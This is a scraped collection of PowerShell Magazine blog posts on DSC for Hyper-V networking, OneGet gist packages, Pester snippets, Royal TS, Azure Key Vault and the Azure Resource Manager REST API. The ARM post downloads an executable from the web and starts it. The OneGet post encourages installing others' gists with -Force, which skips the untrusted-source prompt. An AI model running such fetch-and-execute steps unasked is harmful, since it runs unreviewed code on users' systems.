had introduced DSC resources that can be used to deploy a Hyper-V converged virtual network. In this series of articles, we will build the converged network configuration for what is shown below.\nHere is a recap of configuration needed.\n Create a host network team. Create a VM switch using the host team (today’s article). Create host VM adapters in the management OS to connect to the VM switch and assign VLANs and bandwidth settings.  Assign IP addresses and DNS addresses, as required.  In the earlier article, we created a network team named HostTeam. In today’s article, we will see how to create a converged virtual switch using this host team adapter.\nCreating a converged virtual switch using cVMSwitch DSC resource If you have not downloaded the new DSC resource modules yet, you can do so from my Github repo or using the Install-Module cmdlet in WMF 5.0. To create a converged virtual switch, we will need the cVMSwitch resource from the cHyper-V module.\nThe cVMSwitch resource is a fork from the xVMSwitch resource in the xHyper-V resource module. To be able to create a converged virtual switch, we need to set the MinimumBandwidthMode property. This is what the cVMSwitch resource enables.\nThe Name property is a mandatory one which identifies the VM switch and the Type property defines the type of switch – External or Internal or Private – to be created. The AllowManagementOS boolean property can be used to specify if a VM network adapter in the management OS or root partition should be created. The MinimumBandwidthMode property defines how the bandwidth reservation must be done. If you specify Absolute, the subsequent VM network adapter settings can be used to specify the absolute bandwidth reservation (in mbps). By using Weight as the MinimumBandwidthMode, you can specify a percentage value as the bandwidth reservation for the VM network adapters. We will see more about this in the next article. Finally, the NetAdapterName can be used to specify which host network adapter should be used to create an external VM switch. In our demonstration, this is the HostTeam adapter created using the cNetworkTeam resource.\nLet us see the configuration script that creates the external converged VM switch for us.\nConfiguration DemoNetworkTeam { Import-DscResource -Module cWindowsOS -Name cNetworkTeam Import-DscResource -Module cHyper-V -Name cVMSwitch Node Localhost { #Create Network Team named HostTeam and add NIC1 and NIC2 as members cNetworkTeam NetworkTeam { Name = \u0026#39;HostTeam\u0026#39; TeamingMode = \u0026#39;SwitchIndependent\u0026#39; LoadBalancingAlgorithm = \u0026#39;HyperVPort\u0026#39; TeamMembers = \u0026#39;NIC1\u0026#39;,\u0026#39;NIC2\u0026#39; Ensure = \u0026#39;Present\u0026#39; } #Create a VM Switch from HostTeam adapter and set the Bandwidth mode to weight cVMSwitch HostSwitch { Name = \u0026#39;HostSwitch\u0026#39; Type = \u0026#39;External\u0026#39; AllowManagementOS = $true MinimumBandwidthMode = \u0026#39;Weight\u0026#39; NetAdapterName = \u0026#39;HostTeam\u0026#39; Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cNetworkTeam]NetworkTeam\u0026#39; } } } In the above configuration, I have included both network team and the VM switch creation. I have also added the DependsOn property in the HostSwitch configuration to specify that the VM switch should be created only if the network team named HostTeam exists. Since I set the MinimumBandwidthMode to Weight, subsequent VM network adapter creation must specify the percentage of bandwidth reserve instead of absolute value.\nThis is it. For the converged virtual network, we have created the network team and the VM switch. In the later articles, we will see how to create the VM network adapters in the management OS and complete the converged virtual network configuration.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/21/using-dsc-to-deploy-hyper-v-converged-virtual-network-creating-a-converged-virtual-switch-part-2/","tags":["PowerShell DSC"],"title":"Using DSC to deploy Hyper-V converged virtual network – Creating a converged virtual switch (Part 2)"},{"categories":["PowerShell DSC","Hyper-V"],"contents":"In yesterday’s article, I had introduced DSC resources that can be used to deploy a Hyper-V converged network. Starting today, we will see detailed walk-through for using each of these resources we published yesterday. Using these DSC resources, we will build the converged network configuration for what is shown below.\nHere is a recap of the configuration needed.\n Create a host network team (today’s article). Create a VM switch using the host team. Create host VM adapters in the management OS to connect to the VM switch and assign VLANs and bandwidth settings.  Assign IP addresses and DNS addresses, as required.  let us start!\nCreating a Host Network Team using cNetworkTeam DSC resource If you have not downloaded the new DSC resource modules yet, you can do so from my Github repo or using the Install-Module cmdlet in WMF 5.0. To create a host network team, we will need the cNetworkTeam resource from the cWindowsOS module.\nThe cNetworkTeam resource has two mandatory properties. Using the Name property, you can specify the name of the host team. The TeamMembers property is used to specify all the network connections that should be a part of the host team.\nThe LoadBalancingAlgorigthm is set by default to HyperVPort. The other possible values are Dynamic, IPAddresses, MacAddresses, and TransportPorts. The TeamingMode is by default set to SwitchIndependent and can be modified to either LACP or Static.\nIn my scenario, to create a host team, I am using the following configuration script. Remember that you need to use the Import-DscResource dynamic keyword in the configuration to load the resources from the resource module.\nConfiguration HyperVConvergedNet { Import-DscResource -Module cWindowsOS -Name cNetworkTeam Node Localhost { cNetworkTeam NetworkTeam { Name = \u0026#39;HostTeam\u0026#39; TeamingMode = \u0026#39;SwitchIndependent\u0026#39; LoadBalancingAlgorithm = \u0026#39;HyperVPort\u0026#39; TeamMembers = \u0026#39;NIC1\u0026#39;,\u0026#39;NIC2\u0026#39; Ensure = \u0026#39;Present\u0026#39; } } } When you apply this configuration, a host team gets created.\nIn tomorrow’s article, we will see how we can create a Hyper-V VM switch that is capable of converged networking using cVMSwitch DSC resource.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/20/using-dsc-to-deploy-hyper-v-converged-virtual-network-creating-a-host-team-part-1/","tags":["PowerShell DSC","Hyper-V"],"title":"Using DSC to deploy Hyper-V converged virtual network – Creating a host team (Part 1)"},{"categories":["PowerShell DSC","News"],"contents":"The converged virtual network within Hyper-V deployments is a common configuration. There are multiple ways to deploy the converged network configuration. The simplest method is using the PowerShell cmdlets and a slightly complex way (if you are new to System Center) is using the System Center Virtual Machine Manager. Whatever method you choose, the idea is keep the configuration consistent across the hosts in the deployment. Now, when we talk about configuration and Windows, what is better than using Desired State Configuration?\nRecently, I completed writing a bunch of custom DSC resources to deploy Hyper-V converged networks in my lab! I am happy to share that work with you all today. This release of DSC resources includes two modules and a total of four new resources and update to VM switch DSC resource written by Microsoft. So, the number of DSC resources developed by PowerShell Magazine is now increased to 26! 🙂\nBefore we look at DSC resources in this release, let us take a look at what a Hyper-V converged network is and then map that into the DSC resources that I built.\nWhat is shown above is a typical converged network created on a Hyper-V host. In the scenario I am demonstrating, we have multiple network ports on a physical host that are teamed together to provide load balancing as well as failover. Using the network team that we create, we deploy a Hyper-V virtual switch and add multiple network adapters in the management OS or the root partition. Also, these network adapters are given some bandwidth weight and VLAN configuration. The bandwidth configuration ensures that the host adapters do not overrun the VM network traffic or to ensure they get enough bandwidth when required.\nSo, to be able to complete this deployment using DSC, we need multiple resources. This is what today’s release is about.\n   Resource Name Module Name New or Updated Purpose     cNetworkTeam cWindowsOS New Create a Network Team from physical network interfaces.   cVMSwitch cHyper-V Updated Create Hyper-V Virtual Switch that can be used for converged networking. Note: xVMSwitch from xHyper-V was the base for this resource. I added changes to configure Bandwidth reservation mode and IoV settings.   cVMNetworkAdapter cHyper-V New Create and add a new VM network adapter to either the management OS or a Hyper-V virtual machine.   cVMNetworkAdapterSettings cHyper-V New Configure bandwidth reservation and other settings on the VM adapter in both management OS or VM.   cVMNetworkAdapterVlan cHyper-V New Configure VLAN settings on the VM adapter in both management OS or VM.    While my application of the following DSC resources is deploying a Hyper-V converged network, their functionality is more generic and granular. I could have combined cVMNetworkAdapter, cVMNetworkAdapterSettings, and cVMNetworkAdapterVlan into a single resource. However, that would only increase the complexity of authoring and have too many resource properties to deal with.\nNote: The xHyper-V resource module contains additional resources for dealing with VMs and VHDs. I have not added them except the cVMSwitch to the cHyper-V resource module as I have not modified any of them.\nYou can download these resource modules from my Github repo. These resource modules are available on PowerShell Gallery as well. So, if you are running WMF 5.0, you can download these using the Install-Module cmdlet.\nInstall-Module -Name cWindowsOS Install-Module -Name cHyper-V In today’s article, I have only introduced these resources and their purpose. I will walk-through each of these resources and show you how to build a Hyper-V converged network. Stay tuned!\nMeanwhile, feel free to explore the resources yourself (no rocket science, really!) and let me know what you think.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/19/announcing-dsc-resources-to-deploy-hyper-v-converged-virtual-network/","tags":["PowerShell DSC","News"],"title":"Announcing DSC resources to deploy Hyper-V converged virtual network"},{"categories":["Package Management","OneGet"],"contents":"This article will cover a new powerful feature delivered in the PowerShell 5.0 November Preview. This feature is OneGet. OneGet is a unified package manager for package management systems. A package manager or package management system is a collection of software tools that automates the process of installing, upgrading, configuring, and removing software packages for a computer’s operating system in a consistent manner.\nWhat is OneGet? OneGet is a unified package manager for package management systems. Environments like Perl, Python, Ruby, Node.js, and JavaScript have them. For the Windows world there is the NuGet and Chocolatey package management systems. PowerShell OneGet delivers a common set of cmdlets to install/uninstall packages, add/remove/query package repositories, and query a system for the software installed, regardless of the installation technology underneath.\nPlus, OneGet is open-sourced. This means you can jump on GitHub, see the code used to implement OneGet, participate in discussions about features, and priorities. But wait, there’s more! You can log issues you hit, and you can even create a copy of the source code, make changes and (if you want) request them to be incorporated into the official release.\nOneGet also has an SDK that lets others create providers to interop with other technologies. It seamlessly integrates this layer so you, the PowerShell user, don’t even know you’re looking at different repositories containing any array of source code.\nI used the OneGet SDK to create my OneGet Gist package provider.\nGists Using Gist is a great way to share code. Whether it’s a simple snippet or a full app, Gist is a great way to get your point across. And the fact that every Gist can be copied and modified makes it even better.\nYou can discover gists others have created by going to the gist home page and clicking All Gists. This will take you to a page of all gists sorted and displayed by time of creation or update. You can also search gists by language with Gist Search. Gist search uses the same search syntax as code search.\nWhen you register (for free) on GitHub, you can create gists under your name. Registering lets others discover and install your scripts using the new PowerShell cmdlets found in the OneGet module.\nLet’s Get Started Let’s say you’re searching the Gist repository for some scripts (or a colleague sent you a link to his scripts). Using your browser to navigate to the gist and you have a couple of options to get that code to your machine. You can copy and paste it to a file, to an editor, or you can download it as a zip file (then unzip and edit the unzipped content).\nUsing the Gist Package Provider plugin for OneGet, all you need to do is use Install-Package.\n2.5 steps to getting it working I outline the steps and then walk through them.\n1 – Install PowerShell 5.0 November Preview.\n2 – Get the Gist package I wrote, using Install-Module (another new feature, that is part of the PowerShellGet Package Management Module).\n2.5 – Restart the PowerShell console (this is a one-time requirement).\nYou’re ready to go.\nPowerShellGet PowerShellGet is a package manager for Windows PowerShell. More specifically, it is a wrapper around a new Windows component called OneGet, and it enables simplified package management of PowerShell modules.\nCheck out Kirk Munro’s write-up for a deep dive.\nPowerShellGet is written by Microsoft and leverages the same OneGet SDK I did to get the job done.\nPowerShellGet has a repository, the PowerShell Gallery. The PowerShell Gallery is the central repository for Windows PowerShell content. You can find new Windows PowerShell commands or Desired State Configuration (DSC) resources in the Gallery.\nOn it you’ll find the Gist OneGet provider and you can also check out another module I publish, PowerShellHumanizer, it is used for manipulating and displaying strings, enums, dates, times, timespans, numbers, and quantities.\nSanity Check After you install the November Preview, make sure you have the correct version running, 5.0.9883.0 (or greater if you’re running the latest Windows 10).\nNow you’re ready to install the OneGet Gist Provider, Install-Module GistProvider. You need to run as administrator. If this is your first time running a cmdlet from PowerShellGet, you’ll be prompted to install NuGet, go ahead and say yes. The PowerShell Gallery is set as an untrusted repository out of the box because the repository is not curated. So, you’ll be prompted asking your permission to install it, type y, and press enter.\nNow, restart the PowerShell console. This is a one-time operation because of how OneGet initializes providers and is required only after you install an OneGet package provider.\nIs the Package Provider Ready? After restarting the PowerShell console, make sure the Gist Provider was installed. Use the Get-PackageProvider to list all of the OneGet package providers available.\nLet’s see the provider in action:\nThis sends the list of all my, dfinke, public gists to Out-GridView.\nTyping in Find-Package with no parameters, will not return any Gist package info. Why? Because querying the entire Gist repo of authors and their gists would be in the thousands of thousands, so you need to narrow down to the authors you want to query.\nYou can search for gists using the GitHub webpage. Here is the URL to query all gists with PowerShell, https://gist.github.com/search?q=powershell.\nYou can specify an array of authors for the –Source parameter, for example:\nUsing the filtering capability of Out-GridView, you can see a list of gists by author (Source).\nHow to Install a Gist I have a gist called CFSBuddy.ps1. While OneGet does not support wildcards (yet) you can pass a string to the -Name parameter for matching. Here I’m searching across multiple authors:\nWhen you find the package you want, pipe the results to Install-Package. Again, the Gist Provider is marked as untrusted, prompting you for approval to continue.\nWhere’s the Gist? The gist are installed in $env:LOCALAPPDATA\\OneGet\\Gist. It saves the downloaded file based on the name the author of the gist saved it as. After installing the CFSBuddy.ps1 script, I can run it like this.\n. $env:LOCALAPPDATA\\OneGet\\Gist\\CFSBuddy.ps1\nYou should see this.\nI built this GUI to make it easier to work with the new ConvertFrom-String cmdlet. ConvertFrom-String lets you parse a file by providing a template that contains examples of the desired output data rather than by writing a (potentially complex) script.\nThis PowerShell based GUI lets you easily try out how ConvertFrom-String acts on your data. As you type in either the Data textbox or the Template textbox, two things happen. The PowerShell that does the work is automatically generated and put in the Code textbox at the bottom, and the PowerShell is executed putting the output in the Results textbox. This GUI really speeds up how you interact with ConvertFrom-String.\nCheck out this great write-up on ConvertFrom-String.\nMultiple Gists Using a One-Liner This example searches all gists in the repo for author dfinke that contains the string ‘get’. It returns 9 matching gists.\nPiping that to Install-Package will install all the gists (NOTE: I’m using the –Force switch, now OneGet will not to prompt me about the Gist Provider being an untrusted source).\nAnother Great Way to Share Your Solutions Now that you’ve seen how easy it is to discover and install gists. You can register as a user on GitHub, paste and save your scripts, then email, tweet, blog, post to the Facebook PowerShell page for colleagues and the community to try it out, like this:\nInstall-Package –Source dfinke –Name CFSBuddy.ps1 –Force They paste this into a PowerShell console, press enter and the script is located, downloaded and ready to run. Gists are SRR, scripts ready to run.\nRate Limits GitHub has rate limits. If you do not pass in credentials, you can make 60 requests in an hour. After 60 requests in the hour, the mechanism the Gist Provider uses will no longer return packages. If you use credentials, you can make up to 5,000 requests per hour. The OneGet *Package cmdlets support credentials and this will work if you have registered on GitHub.\nGist Provider on GitHub I wrote this provider after attending the Microsoft MVP Summit and I’ve put the code up on my GitHub Repo. I encourage you to check out how it was done (and my other PowerShell repos).\nIf you’re up for it, make a copy and your own changes. Please open issues, ask questions or submit suggestion changes/improvements.\nAs a side note, GitHub is a social network for building software better, together.\nSo, if you like the provider, visit GitHub and click the star button (and do it for other projects you like). It’s a great way to collaborate, learn, improve your skills and engage with many different communities.\nSummary We’ve covered a lot of features and concepts, including OneGet, PowerShellGet, OneGet Providers (e.g. Gist), GitHub Gist, and only mentioned ConvertFrom-String.\nOneGet and its providers are the easiest way to get PowerShell modules installed (as well as DSC Resources) and it is not just for PowerShell. Check out the list of desired plugins here https://github.com/OneGet/oneget/issues/77. Some are already in development.\nAs a bonus, OneGet has a DSC Resource too. This means more flexibility for your automated DevOps scenarios.\nHappy scripting!\nThank you to June Blender for reviewing the article and the great suggestions.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/14/powershell-oneget-gist-as-a-package/","tags":["Package Management","OneGet"],"title":"PowerShell OneGet: Gist-As-A-Package"},{"categories":["Pester"],"contents":"Authoring Pester tests is easy as it is, but if you are lucky enough to own a copy of ISESteroids 2 it now became even easier. Pester version 3.3.1 adds code snippets for you to use.\nISESteroids comes with TAB expansion of code snippets which is really easy to use. Actually this is how easy it is:\nYou just type a shortcut and press TAB to expand it.\nThere is also little to memorize. The Describe is dsc, the Context is ctx and the assertions use the first letter of each word for shortcut. The only exception is Should Be NullOrEmpty which is just sbn and not sbnoe.\nInstalling the snippets Installing the snippets is easy as well. Update your copy of Pester to the latest version (3.3.1) and import it before importing the latest version of ISESteroids (2.0.13.6).\nThe easiest way to do that is importing both modules in your ISE profile.\nThis is how you do that:\n Expand additional menu to access All tools Open the ISE profile Add calls to Import-Module as shown in picture Restart ISE  As noted by Tobias Weltner, author of ISESteroids: Beginning with the current release 2.0.13.6 loading other modules before ISESteroids should not matter anymore. Loading snippets is still done on startup only though, so you have to load Pester first.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/13/boost-your-productivity-with-pester-snippets/","tags":["Pester"],"title":"Boost your productivity with Pester snippets"},{"categories":["Conferences"],"contents":"The heat is on! The 3rd annual German PowerShell Community conference is taking place in Essen/Ruhr April 22 and 23. Hosted on the venue of the Philharmonics in Essen, Germany, twelve international speakers celebrate a very special and very passionate PowerShell happening with you.\nSpeakers include Bruce Payette, Tobias Weltner, Bartek Bielawski, Jeff Wouters, Holger Schwichtenberg, Peter Monadjemi, Aleksandar Nikolic, and many other well-known experts. With 6 MVPs, three book authors, and a PowerShell team member locked into one conference venue, you’ll likely enjoy the highest concentration of PowerShell wizardry on one spot in the better known part of this universe.\nThis year, the conference presents the state-of-the-art of the PowerShell ecosystem. You will be amazed what can be done with the existing PowerShell, and what the great features (and use cases) are in the upcoming PowerShell 5.0.\nPresentations cover top notch topics such as security and JEA (“Just Enough Admin”), Desired State Configuration deep dives, new class support, and amazing example-based parsing found in PowerShell 5.0. Product-based solutions cover Active Directory troubleshooting, Exchange, Lync, SharePoint, and virtualization. And thanks to OMI and OData, you’ll see how PowerShell even leverages non-Windows systems such as Linux and devices such as network switches.\nAs always, there is plenty of room to connect to the speakers or fellow attendees, exchange scripting secrets, how-tos, personal best practices, and get to know each other at the evening event and the script hackathon. Since this is a German event (most presentations are held in German), if you are not from a German-speaking country, it is recommended that you have at least a read-only German language skill level and practice how to ask for a cold German beer in native tongue for the evening event.\nConference organizer Dr. Tobias Weltner: “The table is set. We established a high class German PowerShell event for anyone to come up, talk, and exchange ideas, and lined up great speakers and unique presentations with real-world relevance. The beer is cold, we are ready for action. Now it’s your turn, we’d like to see at least every larger German company sending a representative: to get firsthand information, and carry a real big bucket of knowledge and inspiration back home to their companies and colleagues.” With Bruce Payette, a highly renowned PowerShell team member, attendees would also have the most direct connection to the PowerShell team to answer questions and take feedback, Weltner added. “Now it’s up to you to keep such a special event in Germany, and support it with your attendance. Get up, register, and come join the fun!”\nAs a Community event, all speakers volunteer. The registration fees pay the venue, the equipment, and catering (drinks and meals, including dinner and the evening event with a selection of truly inspiring drinks).\nThere is a preconference day (April 21) with a separate basic and advanced workshop for those who want to polish their PowerShell knowledge or get a big scoop of advanced training prior to enjoying the conference presentations. Preconference workshops are separate events, and there is separate registration for them.\nAt the end of the conference, all attendees receive a uniquely branded USB stick plus all presentations and materials along with a picture set of conference impressions.\nRegistration is open now at www.powershell.de/konferenz.\nIf your company wants to be a sponsor of this unique event, please contact tobias@powertheshell.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/13/powershell-community-conference-in-germany/","tags":["Conferences"],"title":"PowerShell Community Conference in Germany"},{"categories":["Azure","News"],"contents":"Microsoft announced a public preview of Azure Key Vault. Azure Key Vault is a cloud-hosted HSM-backed service for managing cryptographic keys and other secrets used in your cloud applications.\nTo support the management of the keys and secrets, Azure PowerShell tools is updated to version 0.8.13.\nThe following new cmdlets will be available in AzureResourceManager mode.\n Manage Keys:  Add-AzureKeyVaultKey   Get-AzureKeyVaultKey   Set-AzureKeyVaultKey   Backup-AzureKeyVaultKey   Restore-AzureKeyVaultKey   Remove-AzureKeyVaultKey    Update: These cmdlets do not have the Key Vault creation functionality. This feature is provided as a sample script in a module called KeyVaultManager. You need to download this and create a vault before you can use any of the cmdlets in Azure PowerShell module.\nMore on how you can use these cmdlets in a later post!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/08/powershell-cmdlets-to-manage-azure-key-vault/","tags":["Azure","News"],"title":"PowerShell cmdlets to manage Azure Key Vault"},{"categories":["Module Spotlight","Royal TS"],"contents":"Royal TS is one of many applications on the market for managing Remote Desktop connections. There are also many other features in Royal TS and you can read more about them on their website.\nIn this article, we are going to focus on the new PowerShell module for managing Royal TS Documents.\nThe PowerShell module, introduced in the beta version of Royal TS 3.0, is available here.\nGetting started If you install the MSI file available on the website for the beta version, you can import the module as follows:\nIf you download the ZIP file, you will need to specify the path to the location where the extracted RoyalDocument.PowerShell.dll resides. In the final version of Royal TS 3.0, the module will hopefully be installed to a proper path specified in $env:PSModulePath variable, so that we don’t need to specify the path manually.\nAfter the module is successfully imported, we can explore the available cmdlets:\nThere are 17 cmdlets in the initial version of this module.\nThere aren’t any help available yet, so we can’t use Get-Help to get more information about the cmdlets. However, there are some information in the RoyalTS3.chm file in the Royal TS program folder to help us getting started:\nNext step is to create a Royal Document where we can store connections. As described in the Getting Started section of the help file, we first need to create a new RoyalStore in memory before we can use New-RoyalDocument.\nIn order to store the in-memory document to disk we need to use the Out-RoyalDocument cmdlet:\nCreating Remote Desktop connections Before we go further, you might want to see how the UI looks like. Here is a screenshot of Royal TS 3.0 beta connected to a Server Core instance using Remote Desktop:\nWhat we are going to create next is the Servers folder and Remote Desktop connections on the left side.\nThe inline comments should describe what is happening. When the code is executed, Royal TS opens up, and we can see the new folder and Remote Desktop connection is present:\nIf we right click the Remote Desktop connection we created and go into Properties, we can also see that the Computer Name is configured with the value we supplied as the URI:\nIn the Properties dialog, we can see that there are many options available to configure, such as Remote Desktop Gateway, Window Mode and so on. All of these properties are available on the object we created; a subset of them is visible in the screenshot below:\nAn object of the type RoyalRDSConnection is returned when we call the New-RoyalObject and the Set-RoyalObjectValue cmdlets.\nNext, let’s see how we can configure a couple of these properties as an example:\nWe’ll configure the Credential Configuration to “Use credentials from the parent folder” and the Resize mode to “Smart Sizing”:\nWhen the code has been executed, the changes should be reflected in the UI:\nThe code shown in the examples in this article is available in this Gist.\nPractical example The ability to automate Royal TS documents using PowerShell opens up many interesting scenarios.\nI have created a script which demonstrates a practical example. The following is copied from the script’s comment-based help:\nSyntax\n.\\Update-RoyalFolder.ps1 [-RootOUPath] \u0026lt;String\u0026gt; [[-RoyalDocumentPath] \u0026lt;String\u0026gt;] [-RemoveInactiveComputerObjects ] [[-InactiveComputerObjectThresholdInDays] \u0026lt;String\u0026gt;] [-UpdateRoyalComputerProperties ] [-UpdateRoyalFolderProperties ] [[-RTSPSModulePath] \u0026lt;String\u0026gt;] [\u0026lt;CommonParameters\u0026gt;] Description\n_ This script will mirror the OU structure from the specified root OU to a top level folder in the specified Royal TS document and create Remote Desktop Connection objects for all AD computer accounts meeting specific criteria._\n_ The criteria are the following:_\n_ -The computer object is registered with a Server operating system (the object’s “Operatingsystem” LDAP property meets the filter “Windows Server*”)_\n_ -The computer object is not a Cluster Name Object (the object’s “ServicePrincipalName” LDAP property does not contain the word MSClusterVirtualServer)_\n_ -The computer account has logged on to the domain in the past X number of days (X is 60 days if the parameter InactiveComputerObjectThresholdInDays is not specified)_\n_ The purpose of this script is to show how the Royal TS PowerShell module available in Royal TS 3.0 beta can be used to manage a Royal TS document. Thus it must be customized to meet specific needs, the script shows how to configure a couple of Remote Desktop connection properties as an example._\n_ The script is meant to be scheduled, for example by using PowerShell jobs or scheduled tasks, in order to have an updated Royal TS document based on active computer accounts in one or more specified Active Directory OU(s)._\n_ For smaller environments, it may be appropriate to specify the domain DN as the root OU, but this is not recommended for larger environments. Instead the script may be run multiple times with different OUs specified as the root OU._\nExamples\n_ ————————– EXAMPLE 1 ————————–_\n_ C:\\PS\u0026gt;\u0026amp; C:\\MyScripts\\Update-RoyalFolder.ps1 -RootOUPath ‘OU=Servers,DC=lab,DC=local’ -RoyalDocumentPath C:\\temp\\Servers.rtsz_\n_ Mirrors the OU structure in the C:\\temp\\Servers.rtsz Royal TS document based on computer accounts from the root OU OU=Servers,DC=lab,DC=local_\n_ ————————– EXAMPLE 2 ————————–_\n_ C:\\PS\u0026gt;\u0026amp; C:\\MyScripts\\Update-RoyalFolder.ps1 -RootOUPath ‘OU=Servers,DC=lab,DC=local’ -RoyalDocumentPath C:\\temp\\Servers.rtsz -RemoveInactiveComputerObjects –UpdateRoyalComputerProperties -UpdateRoyalFolderProperties -InactiveComputerObjectThresholdInDays 30_\n_ Mirrors the OU structure in the C:\\temp\\Servers.rtsz Royal TS document based on computer accounts from the root OU OU=Servers,DC=lab,DC=local_\n_ Removes computer accounts already present in the Royal TS document folder, which have not logged on to the domain for the last 10 days._\n_ Enables Smart sizing and inheritance of credentials from the parent folder for existing objects if not already enabled._\nThis is a screenshot of an OU structure from a test environment where I ran the demo script:\nHere is the same OU structure mirrored in Royal TS, created using script:\nThe PowerShell script is available on GitHub.\nSuggestions for improvements If you have suggestions for improvements to the Royal TS PowerShell module, feel free to submit them in the comments section. I’ve already sent the following suggestions to the authors:\n Make it easier to import the module, for example, by adding the path to $env:PSModulePath. Add IntelliSense for parameters with predefined values, for example, for New-RoyalObject’s Type parameter. Add updatable help for the Royal TS PowerShell module. Add the Royal TS installation package to OneGet/Chocolatey Add the Royal TS PowerShell Module to the PowerShell Gallery.  Usage scenarios There are many possible ways to leverage the PowerShell module in order to automate the configuration of Royal TS documents, for example:\n Create a DSC Resource for managing the configuration document, and apply a DSC configuration to an IT Pro’s desktop computer Create an SMA runbook to create a central Royal TS document Create a regular PowerShell script and run it on a regular basis using a PowerShell scheduled job or a scheduled task to create a central Royal TS document  Feel free to share your views on how to leverage the module in a real world scenario.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/08/introducing-the-royal-ts-powershell-module/","tags":["Modules","Royal TS"],"title":"Introducing the Royal TS PowerShell module"},{"categories":["Azure"],"contents":"The Azure Resource Manager PowerShell module has a subset of functionality that the resource management REST API offers.\nSpecifically, the ARM PowerShell module does not include cmdlets to get the resource provider information. Also, note that the ARM REST API requests must be authenticated using Azure Active Directory (AD). This article shows you how to authenticate to Azure AD using PowerShell and access the REST APIs.\nBefore you can start using ARM REST API in PowerShell, you need to first create an AD application and give permissions to access the service management API. These steps are detailed in the MSDN article http://msdn.microsoft.com/en-us/library/azure/dn790557.aspx.\nWe also need the Microsoft.IdentityModel.Clients.ActiveDirectory .NET assembly for creating an access token. This is the Azure Active Directory Authentication library. This can be downloaded from NuGet.org. We can do this using the nuget.exe. The following code snippet shows how to use nuget.exe.\nInvoke-WebRequest -Uri 'https://oneget.org/nuget-anycpu-2.8.3.6.exe' -OutFile \u0026quot;${env:Temp}\\nuget.exe\u0026quot; Start-Process -FilePath \u0026quot;${env:Temp}\\nuget.exe\u0026quot; -ArgumentList 'install Microsoft.IdentityModel.Clients.ActiveDirectory' -WorkingDirectory $env:Temp Add-Type -Path \u0026quot;${env:Temp}\\Microsoft.IdentityModel.Clients.ActiveDirectory.2.13.112191810\\lib\\net45\\Microsoft.IdentityModel.Clients.ActiveDirectory.dll\u0026quot; Once we have the assembly loaded, we can use the AuthenticationContext and then acquire a token for the REST API access. Before we proceed, we need the tenant ID, client ID of the application you created earlier and your Azure subscription ID. The client ID can be obtained from the application dashboard.\nThe tenant ID can be retrieved by running the Get-AzureAccount cmdlet.\nThe following script shows how to build the necessary authorization header for the REST API access.\n$tenantId = 'tenant-id' $clientId = 'client-id' $subscriptionId = 'subscription-id' $authUrl = \u0026quot;https://login.windows.net/${tenantId}\u0026quot; $AuthContext = [Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext]$authUrl $result = $AuthContext.AcquireToken(\u0026quot;https://management.core.windows.net/\u0026quot;, $clientId, [Uri]\u0026quot;https://localhost\u0026quot;, [Microsoft.IdentityModel.Clients.ActiveDirectory.PromptBehavior]::Auto) $authHeader = @{ 'Content-Type'='application\\json' 'Authorization'=$result.CreateAuthorizationHeader() } In the above snippet, the AcquireToken method gives us the access tokens. The [Uri]”https://localhost” needs to be replaced with whatever you mentioned during the creation of application. When the AcquireToken method is executed, you may be prompted for the sign-in details as required.\nFrom the AcquireToken method output, we generate the required authorization header for accessing the REST API.\nList all Azure Resource Providers The REST API for listing all resource providers is https://management.azure.com/subscriptions/{subscription-id}/providers?$skiptoken={skiptoken}\u0026amp;api-version={api-version}.\nWe can use the Invoke-RestMethod cmdlet to access this REST endpoint. We need to use the $authHeader created above with this cmdlet.\n$allProviders = (Invoke-RestMethod -Uri \u0026quot;https://management.azure.com/subscriptions/${subscriptionId}/providers?api-version=2014-04-01-preview\u0026quot; -Headers $authHeader -Method Get -Verbose).Value Get Resource Provider Details The REST API for getting details about a resource provider is https://management.azure.com/subscriptions/{subscription-id}/providers/{resource-provider-namespace}?api-version={api-version}.\n$computeProvider = (Invoke-RestMethod -Uri \"https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.classicCompute?api-version=2014-04-01-preview\" -Headers $authHeader -Method Get -Verbose)  What we have seen so far is only GET requests using the Invoke-RestMethod cmdlet. Some REST API endpoints require POST method. One example we will see now is to register the subscription with a specific resource provider.\nIn the output showing a list of all providers, you see that my subscription is not registered with the Microsoft.Search resource provider. Let us see how we complete this registration using REST API in PowerShell.\nInvoke-RestMethod -Uri \"https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.Search/register?api-version=2014-04-01-preview\" -Method Post -Headers $authHeader -Verbose  Once the registration is complete, you can see that in the all provider output.\nThis is it. I hope you find this helpful! More on the Azure Resource Manager in future posts. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/12/24/using-azure-resource-management-rest-api-in-powershell/","tags":["Azure"],"title":"Using Azure Resource Management REST API in PowerShell"},{"categories":["PowerShell DSC"],"contents":"Ok, this is not as big as the PowerShell team’s holiday gift but something that has been very useful to me. I am sharing the DSC resource module for installing and configuring Microsoft Azure Recovery Services Agent with the community today. With this, the overall count of DSC resources in my Github repo goes to 21!\nAll these modules are available in the PowerShell Gallery. You can find and install them using the cmdlets in the PowerShellGet module.\nInstall-Module -Name cMMAgent Install-Module -Name cWindowsOS Install-Module -Name cWMIPermanentEvents Install-Module -Name cMicrosoftAzureRecoveryServices  Introducing cMicrosoftAzureRecoveryServices DSC module Microsoft Azure Recovery Services Agent (MARS) is used to connect target systems to Azure Backup or Recovery Services vault. This DSC resource module intends to build custom resources for installing and configuring MARS Agent on target systems.\n cMARSAgentInstall is used to install Microsoft Azure Recovery Services Agent. This is a composite resource that uses Package resource behind the scenes.   cMARSProxy is used to configure the proxy settings for the MARS Agent to connect to the Azure Backup Vault.   cMARSRegistration DSC resource should be used to register a target system with the Azure Backup 